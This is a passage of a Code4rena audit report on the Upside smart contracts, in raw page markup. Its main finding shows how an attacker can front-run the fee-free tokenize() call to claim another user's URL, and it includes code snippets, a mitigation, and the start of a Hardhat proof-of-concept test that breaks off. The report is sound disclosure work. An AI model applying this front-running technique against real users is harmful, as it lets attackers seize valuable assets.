100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n\u003c/style\u003e"])</script><script>self.__next_f.push([1,"18:Tefe9,"])</script><script>self.__next_f.push([1,"\u003ch1 id=\"overview\" style=\"position:relative;\"\u003e\u003ca href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eOverview\u003c/h1\u003e\n\u003ch2 id=\"about-c4\" style=\"position:relative;\"\u003e\u003ca href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eAbout C4\u003c/h2\u003e\n\u003cp\u003eCode4rena (C4) is a competitive audit platform where security researchers, referred to as Wardens, review, audit, and analyze codebases for security vulnerabilities in exchange for bounties provided by sponsoring projects.\u003c/p\u003e\n\u003cp\u003eA C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.\u003c/p\u003e\n\u003cp\u003eDuring the audit outlined in this document, C4 conducted an analysis of the Upside smart contract system. The audit took place from May 19 to May 26, 2025.\u003c/p\u003e\n\u003cp\u003eFinal report assembled by Code4rena.\u003c/p\u003e\n\u003ch1 id=\"summary\" style=\"position:relative;\"\u003e\u003ca href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eSummary\u003c/h1\u003e\n\u003cp\u003eThe C4 analysis yielded an aggregated total of 0 High and Medium vulnerabilities. Additionally, C4 analysis included 27 reports detailing issues with a risk rating of LOW severity or non-critical. \u003c/p\u003e\n\u003cp\u003eAll of the issues presented here are linked back to their original finding, which may include relevant context from the judge and Upside team.\u003c/p\u003e\n\u003ch1 id=\"scope\" style=\"position:relative;\"\u003e\u003ca href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eScope\u003c/h1\u003e\n\u003cp\u003eThe code under review can be found within the \u003ca href=\"https://github.com/code-423n4/2025-05-upside\"\u003eC4 Upside repository\u003c/a\u003e, and is composed of 2 smart contracts written in the Solidity programming language and includes 379 lines of Solidity code.\u003c/p\u003e\n\u003ch1 id=\"severity-criteria\" style=\"position:relative;\"\u003e\u003ca href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eSeverity Criteria\u003c/h1\u003e\n\u003cp\u003eC4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.\u003c/p\u003e\n\u003cp\u003eHigh-level considerations for vulnerabilities span the following key areas when conducting assessments:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eMalicious Input Handling\u003c/li\u003e\n\u003cli\u003eEscalation of privileges\u003c/li\u003e\n\u003cli\u003eArithmetic\u003c/li\u003e\n\u003cli\u003eGas use\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eFor more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on \u003ca href=\"https://code4rena.com\"\u003ethe C4 website\u003c/a\u003e, specifically our section on \u003ca href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\"\u003eSeverity Categorization\u003c/a\u003e.\u003c/p\u003e\n\u003ch1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"\u003e\u003ca href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eLow Risk and Non-Critical Issues\u003c/h1\u003e\n\u003cp\u003eFor this audit, 27 reports were submitted by wardens detailing low risk and non-critical issues. The \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-609\"\u003ereport highlighted below\u003c/a\u003e by \u003cstrong\u003eBrene\u003c/strong\u003e received the top score from the judge.\u003c/p\u003e\n\u003cp\u003e\u003cem\u003eThe following wardens also submitted reports: \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-238\"\u003e0xcb90f054\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-373\"\u003e0xhp9\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-117\"\u003e0xozovehe\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-594\"\u003eAnyasaa\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-502\"\u003ebefree3x\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-680\"\u003ec0pp3rscr3w3r\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-420\"\u003eCasinoCompiler\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-226\"\u003edobrevaleri\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-396\"\u003edystopia\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-251\"\u003eeLSeR17\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-115\"\u003efarismaulana\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-287\"\u003eharry\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-465\"\u003ehgrano\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-648\"\u003eJamil\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-171\"\u003eK42\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-618\"\u003eMrPotatoMagic\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-243\"\u003epeppef\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-517\"\u003ePolarizedLight\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-434\"\u003erayss\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-423\"\u003eret2basic\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-436\"\u003eRoger\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-454\"\u003eSafetyBytes\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-547\"\u003esakibcy\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-203\"\u003eSakursf\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-353\"\u003eTigerfrake\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-05-upside/submissions/S-407\"\u003evaminator\u003c/a\u003e.\u003c/em\u003e\u003c/p\u003e\n\u003ch2 id=\"01-front-running-attack-in-tokenize-function\" style=\"position:relative;\"\u003e\u003ca href=\"#01-front-running-attack-in-tokenize-function\" aria-label=\"01 front running attack in tokenize function permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[01] Front-running attack in tokenize function\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L113-L159\"\u003ehttps://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L113-L159\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description\" aria-label=\"finding description permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003etokenize()\u003c/code\u003e function in the \u003ccode\u003eUpsideProtocol\u003c/code\u003e contract allows users to tokenize the provided \u003ccode\u003eurl\u003c/code\u003e. A critical parameter governing this process is \u003ccode\u003etokenizeFeeEnabled\u003c/code\u003e, which determines whether users must pay a fee in order to call the function. When this flag is set to \u003ccode\u003efalse\u003c/code\u003e, users can freely call \u003ccode\u003etokenize()\u003c/code\u003e without paying any fee.\u003c/p\u003e\n\u003cp\u003eThis design introduces a significant front-running risk. Since the function can be called without restriction or cost when fees are disabled, malicious actors can monitor pending transactions in the mempool and submit the same \u003ccode\u003etokenize()\u003c/code\u003e call with a higher gas price to get their transaction mined first.\nOnce the second user successfully tokenizes the provided URL, the contract sets a mapping entry for that URL:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"0\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eurlToMetaCoinMap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_url\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emetaCoinAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis causes \u003ccode\u003eurlToMetaCoinMap[_ur]\u003c/code\u003e to be non-zero. Therefore, when user1’s transaction is eventually mined, the following check fails:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"1\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e       \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eurlToMetaCoinMap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_url\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eMetaCoinExists\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"impact\" style=\"position:relative;\"\u003e\u003ca href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eAttackers can steal high-value URLs (e.g., popular brand names).\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eRequire users to first commit to a hash of the URL, and then reveal the full URL in a second transaction after a short delay. This prevents front-runners from knowing what is being tokenized in the first transaction.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eIn PoC.test.ts, make the following modification:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"2\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import { HardhatEthersSigner } from \u0026quot;@nomicfoundation/hardhat-ethers/signers\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import { ethers as hhethers } from \u0026quot;hardhat\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import {IERC20Metadata, UpsideMetaCoin, UpsideProtocol, UpsideStakingStub} from \u0026quot;../types\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    // Add this import\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   import { expect } from \u0026quot;chai\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eAdd the following test in the same file:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"typescript\" data-index=\"3\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Should permit user2 to execute transactions ahead of user1\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003easync\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eurl1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;https://example1.com\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidityTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidityToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenizeFeeDestinationAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Fee configuration\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenizeFeeEnabled:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenizeFeeDestinationAddress:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenizeFeeDestinationAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeStartingBp:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e9900\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,  \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 99%\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeDecayBp:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan 